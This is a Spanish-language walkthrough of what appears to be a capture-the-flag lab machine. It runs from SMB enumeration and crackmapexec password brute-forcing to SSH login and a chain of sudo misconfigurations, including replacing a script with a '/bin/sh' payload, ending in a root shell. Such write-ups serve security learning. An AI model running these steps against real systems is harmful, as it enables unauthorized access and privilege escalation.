PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

-Hacemos fuzzing web y encontramos la siguiente ruta con lo que parece ser una serie de contraseñas:
	-http://winterfall/dragon/EpisodiosT1

-Las guardamos en passwords.txt

-Enumeramos SMB con smbclient para ver las carpetas existentes:
	-smbclient -N -L //172.17.0.2/
		Sharename       Type      Comment
		---------       ----      -------
		print$          Disk      Printer Drivers
		shared          Disk      
		IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
		nobody          Disk      Home Directories

-No tenemos acceso a la carpeta shared

-Enumeramos el servicio SMB con Enum4linux para buscar usuarios
	-Encontramos los siguientes:
		S-1-22-1-1000 Unix User\jon (Local User)
		S-1-22-1-1001 Unix User\aria (Local User)
		S-1-22-1-1002 Unix User\daenerys (Local User)
	-Los metemos en fichero users.txt

-Hacemos ataque de fuerza bruta al servicio SMB aportando los ficheros de usuarios y contraseñas. Usamos la herramienta crackmapexec:
	-crackmapexec smb 172.17.0.2 -u users.txt -p passwords.txt
	SMB         172.17.0.2      445   BDD88A7D76D8\jon:seacercaelinvierno 

-Enumeramos el contenido de la carpeta /shared de SMB. Nos autenticamos con las credenciales obtenidas:
	-smbclient //172.17.0.2/shared -U jon
	Password for [WORKGROUP\jon]: seacercaelinvierno

-Descargamos el siguiente archivo:
	smb: \> get proteccion_del_reino

-Contiene una contraseña encriptada en base64, la decodificamos y nos autenticamos por ssh:
	-echo 'aGlqb2RlbGFuaXN0ZXI=' | base64 -d
	hijodelanister
	-ssh login: ssh jon@172.17.0.2
	jon@172.17.0.2's password: hijodelanister


## Escalada de Privilegios

-Somos el usuario jon, comandos que puede ejecutar con sudo:
	(aria) NOPASSWD: /usr/bin/python3 /home/jon/.mensaje.py

-Permisos del archivo:
	-rwxrwxr-x 1 aria aria  608 Jul 17  2024 .mensaje.py

-No podemos modificarlo ni inyectar un payload directamente, sin embargo, como el archivo se encuentra dentro del directorio de trabajo de jon --> /home/jon/.mensaje.py , podemos eliminarlo y crear un archivo que se llame igual con el contendido para pivotar a usuario 'aria':
	-Borramos el script: rm /home/jon/.mensaje.py
	-Creamos uno nuevo con el siguiente contenido:
		import os 
		os.system("/bin/sh")

-Ejecutamos el script con los permisos de 'aria' y pivotamos de usuario:
	-sudo -u aria /usr/bin/python3 /home/jon/.mensaje.py
	aria@bdd88a7d76d8:/home/jon$

-Permisos de aria con sudo:
	aria@bdd88a7d76d8:/ sudo -l
	(daenerys) NOPASSWD: /usr/bin/cat, /usr/bin/ls

-Listamos el contenido del directorio 'daenerys' y lo vemos:
	aria@bdd88a7d76d8:/$ sudo -u daenerys /usr/bin/ls /home/daenerys
	mensajeParaJon
	aria@bdd88a7d76d8:/$ sudo -u daenerys /usr/bin/cat /home/daenerys/mensajeParaJon
	-Nos encontramos la contraseña de daenerys --> drakaris

-Permisos de daenerys con sudo:
	daenerys@bdd88a7d76d8:/home/jon$ sudo -l
	    (ALL) NOPASSWD: /usr/bin/bash /home/daenerys/.secret/.shell.sh

-Editamos el archivo con '/bin/sh' y escalamos a root

root@bdd88a7d76d8:/home/jon# whoami
root